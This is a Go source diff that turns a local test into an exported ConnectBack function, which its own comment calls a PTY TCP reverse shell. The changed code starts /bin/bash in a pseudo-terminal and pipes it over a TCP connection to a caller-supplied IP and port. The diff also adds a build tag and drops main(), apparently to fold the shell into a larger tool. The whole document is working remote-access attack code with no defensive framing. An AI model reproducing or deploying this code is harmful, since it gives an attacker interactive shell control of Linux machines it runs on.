@@ -1,3 +1,5 @@
+// +build linux_pty_shell
+
 package main
 
 import (
@@ -12,12 +14,17 @@ import (
 	"github.com/kr/pty"
 )
 
-func test() error {
+func init() {
+
+}
+
+// ConnectBack Send a PTY TCP reverse shell back
+func ConnectBack(ip string, port string) error {
 	// Create arbitrary command.
 	c := exec.Command("/bin/bash")
 
 	// Create TCP connection
-	conn, _ := net.Dial("tcp", "127.0.0.1:1337")
+	conn, _ := net.Dial("tcp", ip+":"+port)
 
 	// Start the command with a pty.
 	ptmx, err := pty.Start(c)
@@ -44,10 +51,4 @@ func test() error {
 	_, _ = io.Copy(conn, ptmx)
 
 	return nil
-}
-
-func main() {
-	if err := test(); err != nil {
-		log.Fatal(err)
-	}
 }
